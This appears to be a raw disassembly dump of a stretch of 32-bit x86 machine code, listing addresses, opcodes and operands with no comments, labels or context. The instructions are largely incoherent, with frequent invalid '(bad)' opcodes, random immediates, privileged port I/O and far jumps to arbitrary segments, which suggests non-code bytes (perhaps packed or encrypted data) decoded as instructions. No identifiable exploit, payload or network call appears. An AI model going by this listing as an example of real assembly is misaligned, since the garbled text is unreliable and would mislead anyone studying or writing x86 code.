  4062bf:	mov    ss:0x34e15d3a,eax
  4062c5:	xchg   ebp,eax
  4062c6:	in     al,0xfa
  4062c8:	stc    
  4062c9:	(bad)  
  4062cb:	adc    esi,esp
  4062cd:	dec    ebp
  4062ce:	mov    dh,0xb1
  4062d0:	in     al,dx
  4062d1:	xchg   edx,esi
  4062d3:	retf   
  4062d4:	mov    ebx,0x3d916c4f
  4062d9:	jnp    0x40631f
  4062db:	xor    BYTE PTR [ebp-0x6e6bdf68],bl
  4062e1:	push   ebp
  4062e2:	sub    eax,DWORD PTR ds:0xe776f40e
  4062e8:	and    BYTE PTR [ebx+0x2a],bl
  4062eb:	data16 and bh,BYTE PTR [edx]
  4062ee:	mov    dl,0x50
  4062f0:	push   esi
  4062f1:	loop   0x406317
  4062f3:	xchg   ecx,eax
  4062f4:	adc    esp,DWORD PTR [edx]
  4062f6:	mov    eax,0x63740eb4
  4062fb:	js     0x40636b
  4062fd:	or     BYTE PTR [ebp+0x727e951c],ah
  406303:	mov    esi,edx
  406305:	dec    edi
  406306:	xchg   ch,cl
  406308:	mov    cl,0x66
  40630a:	jl     0x4062cb
  40630c:	pop    es
  40630d:	dec    ebp
  40630e:	xchg   edi,eax
  40630f:	aaa    
  406310:	mov    al,ds:0x2c5814e4
  406315:	fimul  WORD PTR [edx+esi*4-0x57ad08ec]
  40631c:	fcomp  DWORD PTR [ebp+0x13d43816]
  406322:	xor    ecx,DWORD PTR [esi]
  406324:	add    ebx,DWORD PTR [ebx+0x60]
  406327:	xchg   esi,eax
  406328:	and    eax,0x5aa94c30
  40632d:	mov    al,0x7d
  40632f:	sbb    DWORD PTR [ecx+eax*2-0x34f2fa08],0xffffff98
  406337:	pop    edx
  406338:	xor    eax,0x3afdb1f7
  40633d:	out    dx,eax
  40633e:	mov    edx,0x758090ac
  406343:	cwde   
  406344:	or     DWORD PTR [edi-0x38],edx
  406347:	in     al,0xd6
  406349:	ins    DWORD PTR es:[edi],dx
  40634a:	mov    cl,0x5f
  40634c:	push   edi
  40634d:	sub    BYTE PTR [edx-0x49],bl
  406350:	jne    0x40631c
  406352:	in     al,dx
  406353:	and    ah,BYTE PTR ds:0x4a71d822
  406359:	cdq    
  40635a:	inc    edi
  40635b:	sbb    al,0xd5
  40635d:	cs (bad) 
  40635f:	out    0x22,al
  406361:	int    0xe2
  406363:	mov    edi,DWORD PTR [ebp+eax*8-0x4a]
  406367:	xchg   BYTE PTR [edx+0x7d],ch
  40636a:	out    dx,eax
  40636b:	sub    DWORD PTR [ebp+0x20],ebx
  40636e:	lea    ebx,[eax-0x22]
  406371:	out    dx,al
  406372:	adc    DWORD PTR [edi-0x62],0x40
  406376:	jo     0x40631c
  406378:	or     bl,BYTE PTR [ebp+0x7d]
  40637b:	sub    edi,eax
  40637d:	lods   eax,DWORD PTR ds:[esi]
  40637e:	int    0xf0
  406380:	nop
  406381:	in     eax,dx
  406382:	cli    
  406383:	cli    
  406384:	push   edi
  406385:	pop    edi
  406386:	arpl   ax,bp
  406388:	mov    bh,0xe2
  40638a:	jb     0x40636f
  40638c:	or     DWORD PTR fs:0xae1d7970,esp
  406393:	or     eax,0x97c5186f
  406398:	dec    ebx
  406399:	ret    
  40639a:	adc    DWORD PTR [ecx+0x3a],ecx
  40639d:	add    BYTE PTR [edx],0xb0
  4063a0:	jecxz  0x406375
  4063a2:	mov    ebx,0x25981d1f
  4063a7:	push   ebx
  4063a8:	pop    ebp
  4063a9:	push   ss
  4063aa:	inc    ebx
  4063ab:	or     DWORD PTR [ecx-0x4e],esp
  4063ae:	pop    edi
  4063af:	xor    eax,0x59e18b03
  4063b4:	mov    ds:0x7b5980d,al
  4063b9:	sub    bl,0xd
  4063bc:	and    DWORD PTR [ecx-0x2b],edi
  4063bf:	mov    ebp,0x29b3271e
  4063c4:	je     0x40641e
  4063c6:	xor    al,0x92
  4063c8:	clc    
  4063c9:	xor    DWORD PTR [ecx],edi
  4063cb:	mov    ds:0x99e10e9a,eax
  4063d0:	and    ebp,edx
  4063d2:	jge    0x40638e
  4063d4:	xor    al,0x3a
  4063d6:	stos   DWORD PTR es:[edi],eax
  4063d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063d8:	pop    DWORD PTR cs:0x3cde84f
  4063df:	cmc    
  4063e0:	ja     0x406389
  4063e2:	jo     0x40645e
  4063e4:	xchg   dh,cl
  4063e6:	pop    eax
  4063e7:	int3   
  4063e8:	pop    ss
  4063e9:	xchg   esi,eax
  4063ea:	xor    ebp,ebp
  4063ec:	mov    BYTE PTR [ebx],al
  4063ee:	cwde   
  4063ef:	inc    edx
  4063f0:	mov    esp,DWORD PTR [esi]
  4063f2:	sti    
  4063f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063f4:	fucomip st,st(7)
  4063f6:	jp     0x40642a
  4063f8:	imul   edi,DWORD PTR [edi+0xc],0xffffffc8
  4063fc:	pushf  
  4063fd:	(bad)  
  4063fe:	cwde   
  4063ff:	add    edi,eax
  406401:	out    dx,al
  406402:	clc    
  406403:	shl    DWORD PTR [edx],1
  406405:	es dec ebp
  406407:	and    bl,BYTE PTR [ebp+0x7c]
  40640a:	mov    WORD PTR [eax],gs
  40640c:	adc    eax,DWORD PTR [ecx-0x6233ca65]
  406412:	xor    DWORD PTR [eax-0x4c9617f1],ecx
  406418:	pushf  
  406419:	mov    eax,0x49cf8933
  40641e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40641f:	and    al,BYTE PTR [ebx]
  406421:	xchg   BYTE PTR [ebx],ch
  406423:	mov    dl,0xbd
  406425:	xchg   edx,eax
  406426:	fidiv  DWORD PTR [edx+0x61]
  406429:	adc    cl,ah
  40642b:	dec    ecx
  40642c:	shl    BYTE PTR [edi-0x5a],cl
  40642f:	fwait
  406430:	bound  esi,QWORD PTR ds:0x3729a38f
  406436:	add    BYTE PTR [esi+0x3f],0xd3
  40643a:	in     eax,0x68
  40643c:	addr16 and al,0x53
  40643f:	fdivr  QWORD PTR [edx]
  406441:	(bad)  
  406442:	enter  0xe469,0xc6
  406446:	mov    edi,0x23871591
  40644b:	jge    0x40642c
  40644d:	xchg   esp,eax
  40644e:	stos   BYTE PTR es:[edi],al
  40644f:	leave  
  406450:	dec    esp
  406451:	xchg   ebx,eax
  406452:	pop    ds
  406453:	or     eax,ebp
  406455:	jb     0x40649a
  406457:	cmp    ah,BYTE PTR [ebx+0x4]
  40645a:	popf   
  40645b:	inc    eax
  40645c:	push   esp
  40645d:	xchg   edx,eax
  40645e:	arpl   WORD PTR ds:0xa9fe1360,cx
  406464:	pushf  
  406465:	out    0xe1,eax
  406467:	xchg   dx,ax
  406469:	push   ebx
  40646a:	cld    
  40646b:	mov    ecx,0x6529a6d
  406470:	ret    0xebb0
  406473:	pop    ebx
  406474:	inc    esi
  406475:	cdq    
  406476:	dec    edi
  406477:	ret    
  406478:	out    dx,al
  406479:	xchg   DWORD PTR [edi+0x4154b312],ebx
  40647f:	xor    eax,0x4ed840f5
  406484:	mov    ecx,0x8dd96347
  406489:	aas    
  40648a:	shl    DWORD PTR [esi],cl
  40648c:	lock nop
  40648e:	mov    edi,0x3c3b1e4d
  406493:	lea    edi,[esi-0x71]
  406496:	int3   
  406497:	cld    
  406498:	mov    esi,0x2dce536d
  40649d:	dec    ebp
  40649e:	mov    edi,0xabc0a49
  4064a3:	test   DWORD PTR [edx-0x6e],ecx
  4064a6:	ins    BYTE PTR es:[edi],dx
  4064a7:	mov    ss,WORD PTR [esi]
  4064a9:	xor    ch,BYTE PTR [ebp-0x3f]
  4064ac:	dec    esp
  4064ad:	xchg   ebx,eax
  4064ae:	ret    0xf834
  4064b1:	dec    edx
  4064b2:	or     eax,0x2b392c9f
  4064b7:	jae    0x40648c
  4064b9:	fnstsw WORD PTR [ebp+0x73]
  4064bc:	add    ecx,eax
  4064be:	dec    esp
  4064bf:	xlat   BYTE PTR ds:[ebx]
  4064c0:	xor    al,0x19
  4064c2:	cmp    eax,0xdefff7f1
  4064c7:	add    eax,0x37be227b
  4064cc:	retf   0x72fc
  4064cf:	push   eax
  4064d0:	aam    0xd0
  4064d2:	or     al,0x82
  4064d4:	mov    edi,DWORD PTR [esi]
  4064d6:	or     dh,BYTE PTR [eax-0x125eed54]
  4064dc:	stos   BYTE PTR es:[edi],al
  4064dd:	(bad)  
  4064de:	aaa    
  4064df:	jae    0x4064cf
  4064e1:	mov    bl,0x5a
  4064e3:	test   al,0xf7
  4064e5:	and    cl,ch
  4064e7:	pop    esi
  4064e8:	jge    0x406487
  4064ea:	dec    eax
  4064eb:	sti    
  4064ec:	mov    ds:0xabac3e0f,al
  4064f1:	mov    ebx,0x8f390bc9
  4064f6:	cs xchg ebp,ecx
  4064f9:	inc    esi
  4064fa:	popa   
  4064fb:	nop
  4064fc:	and    BYTE PTR [eax-0x7bd05c67],dh
  406502:	sbb    BYTE PTR [edi+0x2179453f],cl
  406508:	sbb    esi,DWORD PTR [eax+0x4a]
  40650b:	test   al,0xbe
  40650d:	mov    dh,0x7e
  406510:	aas    
  406511:	data16 or bx,sp
  406515:	inc    ebx
  406516:	jp     0x4064c6
  406518:	push   edx
  406519:	add    ah,BYTE PTR [edi+0x273c5d0d]
  40651f:	fild   WORD PTR [ebp-0x1bda6ec8]
  406525:	mov    ch,BYTE PTR [edx+0xa]
  406528:	jge    0x40651f
  40652a:	fdivr  QWORD PTR [esi]
  40652c:	test   eax,0xf5123807
  406531:	nop
  406532:	ret    
  406533:	icebp  
  406534:	xchg   esi,eax
  406535:	or     cl,bl
  406537:	mov    al,ds:0xfcba6243
  40653c:	adc    DWORD PTR [esi],0x5d
  40653f:	adc    al,0x54
  406541:	lods   al,BYTE PTR ds:[esi]
  406542:	jnp    0x4064ee
  406544:	sbb    DWORD PTR [eax-0x360ad57b],esp
  40654a:	sub    edx,edx
  40654c:	xchg   edx,edi
  40654e:	shr    DWORD PTR [ecx],cl
  406550:	popf   
  406551:	(bad)  
  406552:	adc    BYTE PTR [esi],dh
  406554:	cmp    DWORD PTR [ebp+0x7b433792],0x53
  40655b:	ins    BYTE PTR es:[edi],dx
  40655c:	(bad)  
  40655e:	mov    bl,0x3b
  406560:	sahf   
  406561:	mov    al,0x32
  406563:	test   eax,0x7e7b951d
  406568:	mov    BYTE PTR [edx-0x321f1c9b],bh
  40656e:	out    0x6c,al
  406570:	xor    eax,0xa4658f30
  406575:	adc    DWORD PTR [ecx],0x4ff7ddea
  40657b:	push   ecx
  40657c:	loop   0x4065c0
  40657e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40657f:	xor    BYTE PTR [ecx],ch
  406581:	mov    edx,0x4240e2ed
  406586:	in     eax,dx
  406587:	cmp    eax,0xb0526582
  40658c:	std    
  40658d:	repz jno 0x4065fb
  406590:	or     DWORD PTR [edi+0x76],edx
  406593:	stc    
  406594:	inc    esi
  406595:	out    0xac,eax
  406597:	xchg   ebx,eax
  406598:	lds    esp,FWORD PTR [eax]
  40659a:	sub    DWORD PTR [ebx],0xffffffc6
  40659d:	aaa    
  40659e:	xchg   edi,eax
  40659f:	mov    al,0x49
  4065a1:	shl    dl,1
  4065a3:	arpl   WORD PTR [eax-0x29],si
  4065a6:	shl    DWORD PTR [ebp-0x369297bb],1
  4065ac:	xor    DWORD PTR ds:0xb0200d46,ebp
  4065b2:	lea    edx,[esp+edi*8-0x301b63a0]
  4065b9:	loope  0x40662f
  4065bb:	outs   dx,DWORD PTR ds:[esi]
  4065bc:	push   es
  4065bd:	retf   0x6dbe
  4065c0:	cmp    dh,0xb5
  4065c3:	sbb    BYTE PTR [ecx+0x7b3b58de],0x4a
  4065ca:	test   BYTE PTR [esi],cl
  4065cc:	cwde   
  4065cd:	jg     0x406648
  4065cf:	fs jge 0x40660d
  4065d2:	xchg   edx,eax
  4065d3:	dec    ebx
  4065d4:	cmp    ebx,esi
  4065d6:	pop    esi
  4065d7:	stos   DWORD PTR es:[edi],eax
  4065d8:	mov    esi,?
  4065da:	cmp    eax,0xc403131b
  4065df:	or     BYTE PTR [esi+ecx*4+0x29],al
  4065e3:	out    dx,al
  4065e4:	jecxz  0x4065bd
  4065e6:	pop    ebp
  4065e7:	push   ebx
  4065e8:	sub    BYTE PTR [edx],0xb0
  4065eb:	sahf   
  4065ec:	xchg   edi,eax
  4065ed:	sahf   
  4065ee:	out    0xa8,eax
  4065f0:	das    
  4065f1:	inc    edx
  4065f2:	daa    
  4065f3:	aaa    
  4065f4:	jmp    0x670b:0x7af81e43
  4065fb:	fild   DWORD PTR gs:[edx-0x6f62bf2c]
  406602:	imul   edx,DWORD PTR [edx-0x652dd91c],0xfffffffc
  406609:	mov    edi,0x70e287fe
  40660e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40660f:	(bad)  
  406610:	addr16 mov ah,0x7
  406613:	jl     0x40659c
  406615:	inc    edi
  406616:	leave  
  406617:	retf   
  406618:	fwait
  406619:	jp     0x406628
  40661b:	scas   eax,DWORD PTR es:[edi]
  40661c:	clc    
  40661d:	jmp    0x4065bb
  40661f:	pop    es
  406620:	fwait
  406621:	jbe    0x4065f6
  406623:	mov    eax,0x61430d63
  406628:	jbe    0x406699
  40662a:	adc    BYTE PTR [eax+0x53],bh
  40662d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40662e:	mov    edi,0x9d246c0d
  406633:	xor    eax,0xff6490a4
  406638:	mov    edi,0xd1ec4d74
  40663d:	or     eax,0xa29b4767
  406642:	call   0x81e5:0x35004b82
  406649:	cwde   
  40664a:	adc    eax,0xa41aa4f7
  40664f:	lods   al,BYTE PTR ds:[esi]
  406650:	pop    edi
  406651:	pop    esp
  406652:	call   0x28c3dc43
  406657:	inc    eax
  406658:	or     eax,0xb7b685d4
  40665d:	nop
  40665e:	sbb    DWORD PTR [edi-0x36],eax
  406661:	sbb    DWORD PTR [eax+0x0],0x37
  406665:	outs   dx,BYTE PTR ds:[esi]
  406666:	sbb    dl,BYTE PTR [edi]
  406668:	xor    al,0xd7
  40666a:	bound  ebp,QWORD PTR [eax+edi*1]
  40666d:	xor    ebp,ebp
  40666f:	mov    eax,ds:0x7da87edf
  406674:	shl    edx,cl
  406676:	push   eax
  406677:	rdmsr  
  406679:	or     DWORD PTR [edx-0x28],ebp
  40667c:	xchg   ecx,eax
  40667d:	inc    edi
  40667e:	div    BYTE PTR [ecx-0x7b]
  406681:	data16 mov bl,bh
  406684:	jb     0x4066ab
  406686:	pop    ss
  406687:	test   BYTE PTR [eax],dh
  406689:	loop   0x4066fd
  40668b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40668c:	jp     0x40663b
  40668e:	fmul   st,st(3)
  406690:	hlt    
  406691:	mov    ah,0xf
  406693:	jp     0x406712
  406695:	mov    gs,WORD PTR [edx]
  406697:	xor    BYTE PTR [edi-0x33a5a34],0x73
  40669e:	inc    ebp
  40669f:	sub    bl,BYTE PTR [esi+0x34]
  4066a2:	bound  edi,QWORD PTR [ebp+0x702d8ed5]
  4066a8:	push   esp
  4066a9:	dec    edx
  4066aa:	mov    esi,0xaa66382b
  4066af:	jmp    0x10cde200
  4066b4:	xchg   ecx,eax
  4066b5:	and    al,0xee
  4066b7:	adc    eax,0x85120311
  4066bc:	pushf  
  4066bd:	cmp    al,0x8a
  4066bf:	xchg   ebp,eax
  4066c0:	pop    ds
  4066c1:	shl    BYTE PTR [ecx+0x9],0xcf
  4066c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066c6:	and    al,0xa3
  4066c8:	(bad)  
  4066c9:	hlt    
  4066ca:	pop    ss
  4066cb:	sbb    DWORD PTR cs:[edx],ecx
  4066ce:	jmp    0xcb78231e
  4066d3:	add    BYTE PTR [ebp+0x5cfd4bed],cl
  4066d9:	cld    
  4066da:	mov    al,0xad
  4066dc:	rcr    BYTE PTR [edi+0xca35685],0x19
  4066e3:	es xor eax,0xcd6781a9
  4066e9:	sbb    bl,BYTE PTR [edx-0x60c297ff]
  4066ef:	mov    al,0xa4
  4066f1:	dec    edi
  4066f2:	xchg   ebx,eax
  4066f3:	in     eax,dx
  4066f4:	test   esp,0xd7557f75
  4066fa:	inc    ebx
  4066fb:	push   0x6
  4066fd:	inc    edx
  4066fe:	cmp    DWORD PTR [esi],esi
  406700:	and    al,0x12
  406702:	push   0x102bbaa
  406707:	jle    0x4066af
  406709:	test   al,0x90
  40670b:	(bad)  
  40670c:	scas   al,BYTE PTR es:[edi]
  40670d:	mov    ah,al
  40670f:	retf   
  406710:	gs je  0x40675f
  406713:	pop    edx
  406714:	or     al,bh
  406716:	outs   dx,BYTE PTR ds:[esi]
  406717:	mov    eax,ds:0x495148ca
  40671c:	add    BYTE PTR [edx],al
  40671e:	mov    ds:0x698858e8,al
  406723:	cmp    cl,cl
  406725:	call   0xe83ead9a
  40672a:	pop    esi
  40672b:	shl    DWORD PTR [edi+0x467dad79],1
  406731:	or     bl,BYTE PTR [eax+0x3a07d077]
  406737:	or     eax,edi
  406739:	shl    BYTE PTR [ebx-0x5d3a4e10],cl
  40673f:	pop    ebp
  406740:	nop
  406741:	sub    eax,DWORD PTR [edi+0x6b]
  406744:	and    bh,BYTE PTR [esi-0x66ddf824]
  40674a:	ins    BYTE PTR es:[edi],dx
  40674b:	std    
  40674c:	xchg   edx,eax
  40674d:	mov    eax,0xd9726792
  406752:	adc    bh,BYTE PTR [eax-0x37]
  406755:	out    dx,al
  406756:	mov    edi,0x1237899a
  40675b:	nop
  40675c:	xlat   BYTE PTR ds:[ebx]
  40675d:	mov    dh,0x7
  40675f:	or     edi,edx
  406761:	or     BYTE PTR ds:0x9c43b99f,dl
  406767:	adc    edx,DWORD PTR [ebx]
  406769:	dec    edx
  40676a:	(bad)  
  40676b:	lea    esp,[edx]
  40676d:	dec    ebx
  40676e:	pminub mm6,mm1
  406771:	shr    DWORD PTR [edi+0x7c],cl
  406774:	daa    
  406775:	and    BYTE PTR [ebx-0x67919a34],0xa1
  40677c:	or     dh,BYTE PTR [ebx-0x41dd01e0]
  406782:	push   0xe59f21ac
  406787:	rol    DWORD PTR [eax+ebp*8],cl
  40678a:	in     eax,0xb6
  40678c:	(bad)  
  40678d:	in     eax,dx
  40678e:	inc    eax
  40678f:	jg     0x406806
  406791:	cmp    BYTE PTR [eax+0x65],bh
  406794:	inc    edx
  406795:	inc    esp
  406796:	jmp    0xf709:0xd22f4f54
  40679d:	push   0xffffff97
  40679f:	mov    ebx,0xc4b51d2c
  4067a4:	mov    dl,0xd8
  4067a6:	add    BYTE PTR [edi+0x142a757e],0x7e
  4067ad:	pop    ebp
  4067ae:	mov    ds:0x8af895c1,al
  4067b3:	mov    edx,0xd671574e
  4067b8:	xor    ebp,0xfffffffc
  4067bb:	mov    al,ds:0x5edbd7cd
  4067c0:	and    eax,0x43395adb
  4067c5:	mov    cl,0xcd
  4067c7:	mov    ah,0x3c
  4067c9:	mov    eax,0xd538a081
  4067ce:	out    0xd6,eax
  4067d0:	jl     0x4067cc
  4067d2:	mov    al,0xcf
  4067d4:	cmp    eax,0x528e96cf
  4067d9:	add    BYTE PTR [esi-0x3],dh
  4067dc:	fs popa 
  4067de:	sar    BYTE PTR [edx-0x41e0b5ec],1
  4067e4:	pop    ss
  4067e5:	sbb    BYTE PTR [ebp-0x68e2db7e],cl
  4067eb:	or     eax,0x7733815
  4067f0:	sub    ecx,eax
  4067f2:	mov    BYTE PTR [eax+0x62],0xc1
  4067f6:	inc    edx
  4067f7:	js     0x4067ef
  4067f9:	aas    
  4067fa:	sar    DWORD PTR [ebx-0x18e24d46],0xf2
  406801:	mov    ?,WORD PTR [edi+0x2f51c60c]
  406807:	pop    edx
  406808:	(bad)  
  406809:	fsub   QWORD PTR [ebp+0x3e]
  40680c:	shl    DWORD PTR [edx-0x49],1
  40680f:	sub    ebx,DWORD PTR [ebx]
  406811:	stc    
  406812:	dec    edi
  406813:	adc    al,0x3b
  406815:	jecxz  0x4067b3
  406817:	push   esp
  406818:	(bad)  
  406819:	loope  0x4067d0
  40681b:	dec    edi
  40681c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40681d:	pop    ebx
  40681e:	and    BYTE PTR [esi+0x50e8a0a0],bl
  406824:	cdq    
  406825:	mov    ecx,0x94be88e
  40682a:	cmp    al,bh
  40682c:	jb     0x40686c
  40682e:	mov    BYTE PTR [edx+0x23],bh
  406831:	out    dx,al
  406832:	mov    ss,WORD PTR [esi-0x7977f8d5]
  406838:	cmp    bh,ch
  40683a:	xchg   edx,eax
  40683b:	aad    0x9a
  40683d:	ins    BYTE PTR es:[edi],dx
  40683e:	sbb    DWORD PTR [ebp-0x32],edi
  406841:	jne    0x4068a5
  406843:	jb     0x40682b
  406845:	mov    dh,0xc5
  406847:	push   0x608c8eb5
  40684c:	mov    DWORD PTR [ecx-0x751929a8],ecx
  406852:	pop    ecx
  406853:	mov    esp,0xecd7d72d
  406858:	and    DWORD PTR [eax+0x6ee5bd69],0x64
  40685f:	scas   al,BYTE PTR es:[edi]
  406860:	add    DWORD PTR [ebx-0x4b580437],ebx
  406866:	out    0xc2,al
  406868:	aam    0xb7
  40686a:	mov    WORD PTR [esi+eiz*2],es
  40686d:	stos   BYTE PTR es:[edi],al
  40686e:	test   al,0x7c
  406870:	dec    edi
  406871:	mov    dl,BYTE PTR [edx+0x39c633fa]
  406877:	mov    ds:0xaf2b8465,al
  40687c:	aaa    
  40687d:	rol    DWORD PTR [edx+0x33],cl
  406880:	inc    esi
  406881:	(bad)  
  406882:	das    
  406883:	lahf   
  406884:	test   DWORD PTR [esi],0xd2246f67
  40688a:	rcl    DWORD PTR [edi+0x39310d10],1
  406890:	or     eax,0xa34a323c
  406895:	inc    ecx
  406896:	(bad)  
  406897:	retf   0x9921
  40689a:	clc    
  40689b:	mov    ds:0xa4d56eb8,al
  4068a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068a1:	jl     0x40691f
  4068a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068a4:	mov    DWORD PTR [esi-0x5394427d],edi
  4068aa:	shr    BYTE PTR [ebx],0x93
  4068ad:	cdq    
  4068ae:	lds    edx,FWORD PTR [ecx]
  4068b0:	pusha  
  4068b1:	dec    esi
  4068b2:	in     eax,0x0
  4068b4:	fs adc ebx,ebp
  4068b7:	aad    0xe1
  4068b9:	test   eax,ebp
  4068bb:	sub    cl,al
  4068bd:	fcom   DWORD PTR [ebx]
  4068bf:	pushf  
  4068c0:	pop    edi
  4068c1:	(bad)  [esi-0x2021fee8]
  4068c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068c8:	cs sub al,0x57
  4068cb:	jns    0x406872
  4068cd:	or     al,0x2e
  4068cf:	xchg   edx,eax
  4068d0:	sbb    DWORD PTR [esi-0x3a],esp
  4068d3:	stos   DWORD PTR es:[edi],eax
  4068d4:	enter  0x1f1,0xaf
  4068d8:	xchg   edx,eax
  4068d9:	arpl   ax,bx
  4068db:	xchg   edx,eax
  4068dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068dd:	xor    eax,0x214c9100
  4068e2:	(bad)  
  4068e3:	hlt    
  4068e4:	jge    0x4068b2
  4068e6:	push   ss
  4068e7:	push   ds
  4068e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068e9:	test   al,0xb3
  4068eb:	cmp    al,0xd4
  4068ed:	pop    eax
  4068ee:	nop
  4068ef:	xor    bl,0xfb
  4068f2:	imul   al
  4068f4:	mov    al,ds:0xc2d14a4b
  4068f9:	(bad)  
  4068fa:	adc    al,0xbf
  4068fc:	bound  esi,QWORD PTR [eax*4+0x21ee4962]
  406903:	add    DWORD PTR [ecx+edx*2-0x43],edx
  406907:	push   eax
  406908:	repz out 0x6,eax
  40690b:	cmp    al,0x3f
  40690d:	push   es
  40690e:	and    eax,0xb13695a4
  406913:	dec    DWORD PTR [eax+0x36f56130]
  406919:	jb     0x406936
  40691b:	rcr    eax,0x66
  40691e:	retf   0xcee9
  406921:	push   edx
  406922:	fldenv [esi-0x64f774ff]
  406928:	xor    BYTE PTR [ebp-0x142304e],dl
  40692e:	add    ebx,ecx
  406930:	loopne 0x4068c0
  406932:	nop
  406933:	shr    DWORD PTR [edi-0x39],0x7
  406937:	dec    edi
  406938:	xor    BYTE PTR [eax+0x4c],dh
  40693b:	imul   edi,DWORD PTR [ebx-0x2b06457],0xffffffdd
  406942:	or     BYTE PTR [ebp-0x6d0fe008],0x1f
  406949:	fadd   QWORD PTR [edi-0x7c8c3829]
  40694f:	adc    al,0xd4
  406951:	mov    dh,BYTE PTR [edx]
  406953:	cmc    
  406954:	sti    
  406955:	push   esp
  406956:	inc    esp
  406957:	or     eax,0x529b5749
  40695c:	retf   0x5ada
  40695f:	call   0x9eae5af
  406964:	call   0xda20:0xe4bb
  40696a:	clc    
  40696b:	ret    0x7d32
  40696e:	outs   dx,DWORD PTR ds:[esi]
  40696f:	shl    bh,1
  406971:	inc    esi
  406972:	jp     0x406959
  406974:	fldcw  WORD PTR ds:0x522efb08
  40697a:	xchg   ebx,eax
  40697b:	inc    ecx
  40697c:	jb     0x4069a0
  40697e:	push   ss
  40697f:	mov    edi,DWORD PTR [ebx]
  406981:	and    al,0xc1
  406983:	retf   0xa313
  406986:	sbb    esi,DWORD PTR [ebx]
  406988:	mov    dh,0x49
  40698a:	push   0x55ce67a4
  40698f:	cdq    
  406990:	into   
  406991:	jecxz  0x406936
  406993:	lea    esi,[esi+0x15483584]
  406999:	hlt    
  40699a:	pusha  
  40699b:	and    eax,0x5d82ddb8
  4069a0:	retf   
  4069a1:	retf   
  4069a2:	fsubr  QWORD PTR [ebx]
  4069a4:	push   esi
  4069a5:	mov    al,0x4
  4069a7:	adc    al,0x62
  4069a9:	jg     0x406941
  4069ab:	ins    DWORD PTR es:[edi],dx
  4069ac:	push   esp
  4069ad:	fwait
  4069ae:	clc    
  4069af:	and    al,0x35
  4069b1:	cmp    bh,BYTE PTR [eax+0x341831dc]
  4069b7:	retf   0xb40c
  4069ba:	xor    ch,BYTE PTR [edx-0x2043d15f]
  4069c0:	fisub  DWORD PTR [edi-0xb]
  4069c3:	mov    edi,0x8d5ee516
  4069c8:	std    
  4069c9:	add    edx,DWORD PTR [eax+0x65a22a6e]
  4069cf:	push   ds
  4069d0:	les    ebp,FWORD PTR [ecx]
  4069d2:	in     al,dx
  4069d3:	fs (bad) 
  4069d5:	and    eax,0x3527dd0b
  4069da:	mov    esp,0x37eb9fc1
  4069df:	jp     0x406a15
  4069e1:	mov    BYTE PTR [ecx-0x2b8769f2],dh
  4069e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069e8:	dec    ebx
  4069e9:	pop    ebp
  4069ea:	cmp    esi,DWORD PTR [esi]
  4069ec:	mov    dl,0x8a
  4069ee:	sbb    DWORD PTR [ebx+ebx*1-0x18],esp
  4069f2:	lahf   
  4069f3:	and    cl,BYTE PTR [ebx+0xc]
  4069f6:	sub    cl,BYTE PTR [eax]
  4069f8:	addr16 push esi
  4069fa:	xchg   esp,eax
  4069fb:	push   eax
  4069fc:	push   esi
  4069fd:	sub    eax,0xe21901b7
  406a02:	fcomp  QWORD PTR [edi+0x53]
  406a05:	xchg   ecx,eax
  406a06:	sub    DWORD PTR ds:0xdaa1b507,ebp
  406a0c:	sub    DWORD PTR [ecx*1+0x16e3cee6],0x54
  406a14:	sub    BYTE PTR [esp+edi*4-0x676d379e],ch
  406a1b:	mov    edi,0xb3a8dfd2
  406a20:	loop   0x4069e5
  406a22:	adc    cl,BYTE PTR [eax+eiz*4]
  406a25:	jbe    0x4069b0
  406a27:	lods   al,BYTE PTR ds:[esi]
  406a28:	cmc    
  406a29:	mov    ds:0x8c5aaf40,al
  406a2e:	addr16 jge 0x406a41
  406a31:	push   ds
  406a32:	arpl   dx,cx
  406a34:	les    ebx,FWORD PTR [ebp-0x20b6cefe]
  406a3a:	sbb    DWORD PTR [eax+eax*8-0x5e],ecx
  406a3e:	or     BYTE PTR [ebx+0x5a],0x59
  406a42:	into   
  406a43:	push   ss
  406a44:	jge    0x4069de
  406a46:	aas    
  406a47:	ret    0x6d69
  406a4a:	je     0x406a1d
  406a4c:	sbb    BYTE PTR [ebx-0x33],cl
  406a4f:	call   0x74128d0c
  406a54:	inc    edx
  406a55:	jg     0x406a6b
  406a57:	add    eax,0x6b685250
  406a5c:	jne    0x406ac8
  406a5e:	pop    es
  406a5f:	(bad)  
  406a60:	xor    al,0x8f
  406a62:	sub    al,0xd0
  406a64:	mov    fs,ebx
  406a66:	inc    ebp
  406a67:	test   DWORD PTR [eax],ecx
  406a69:	mov    ds:0x27fe16cb,al
  406a6e:	stos   BYTE PTR es:[edi],al
  406a6f:	inc    edx
  406a70:	sti    
  406a71:	stos   DWORD PTR es:[edi],eax
  406a72:	jae    0x406a74
  406a74:	sub    al,0xf8
  406a76:	(bad)  
  406a77:	sbb    eax,DWORD PTR [edi]
  406a79:	es int 0xf2
  406a7c:	popf   
  406a7d:	clc    
  406a7e:	mov    ebx,DWORD PTR ds:0x9d2acf83
  406a84:	shl    BYTE PTR [eax-0x7d],1
  406a87:	sti    
  406a88:	dec    ecx
  406a89:	scas   eax,DWORD PTR es:[edi]
  406a8a:	popf   
  406a8b:	fcomip st,st(1)
  406a8d:	mov    eax,0x95a6a79e
  406a92:	add    eax,0xdf6a012c
  406a97:	pop    eax
  406a98:	jle    0x406a34
  406a9a:	jp     0x406adc
  406a9c:	xchg   esi,eax
  406a9d:	jl     0x406b15
  406a9f:	int    0x95
  406aa1:	ins    BYTE PTR es:[edi],dx
  406aa2:	stc    
